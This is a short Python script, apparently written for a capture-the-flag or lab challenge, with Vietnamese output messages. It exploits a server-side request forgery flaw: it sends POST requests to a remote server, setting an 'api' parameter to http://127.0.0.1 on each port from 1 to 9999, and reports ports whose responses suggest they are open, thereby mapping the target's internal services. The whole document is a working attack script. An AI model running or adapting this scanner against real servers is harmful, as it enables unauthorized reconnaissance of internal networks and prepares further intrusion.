import requests

SERVER_URL = f"http://154.57.164.72:30104/"
header = {
    "Content-Type": "application/x-www-form-urlencoded"
}
for i in range (1,10000):
    payload = f"api=http://127.0.0.1:{i}"
    try:
        response = requests.post(SERVER_URL, data=payload, headers=header)
        content = response.text
        if response.status_code == 200:
            if "Error (7)" not in content:
                print(f"Cổng mở: {i}")
        else:  
            print(f"Cổng phản hồi khác 200: {i}")
    except Exception as e:
        print("Lỗi khi request")
